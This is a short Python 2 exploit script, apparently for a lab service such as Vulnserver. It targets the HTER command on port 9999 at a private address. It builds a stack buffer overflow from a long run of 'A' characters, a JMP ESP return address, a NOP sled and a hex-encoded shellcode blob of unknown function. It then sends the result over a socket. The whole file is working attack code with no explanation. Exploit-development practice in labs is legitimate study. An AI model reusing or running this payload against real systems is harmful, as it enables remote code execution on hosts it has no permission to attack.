#!/usr/bin/python

import os
import sys
import socket

# JMP ESP: 62501203 (Only contains ascii characters.)

shellcode = 'bab2c5429cdbc0d97424f45833c9b15231501283c00403e2cba069fe3ca692febcc71b1b8dc77868bef70b3c337359d4c0f176db61bfa0d272ec9175f1efc555c83f18940d5dd1c4c62944f8636755733f69dd608888cc3782d2ceb6476f47a0844a115b7e20a08d4ec90ff07e385135b8a3244fba5e3f94c084ca0e624e6cea9283eb7998687f25bd6fac5eb9e453b04bbe77141764190dfdcb264d5eb3820673a0be451c05f375dc018406ee8e3e8042469957a47d5dc75b7e9ece9f2ace7809538578b6860a281879eb98d82983f2d616b3fd3c3f5e04d78037073a694a075535c3e13fd585bad74c8c3049901a3d491aa9c204ebc4d0f11b938a542309a23bb6d63235ab4065121d99e38e04331153d07c91882182185c1da00a989eec7e74c9ba2832a30c82ec18c7426853d81475beaef8c417f707e8ffff701460ffab9c904af1b53813608424a45fcb502755b4a6371cb1e3ffcdcb7c6af1787cbf'

payload = ''
payload += 'A' * 2041
payload += 'AF115062'
payload += '90' * 16
payload += shellcode
payload += 'C' * (3000 - len(payload))


# Send the 1st stage payload to the HTER command
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect.connect(('192.168.1.30',9999))
print connect.recv(1024)
connect.send('HTER ' + payload + '\r\n')
connect.recv(1024)
connect.close()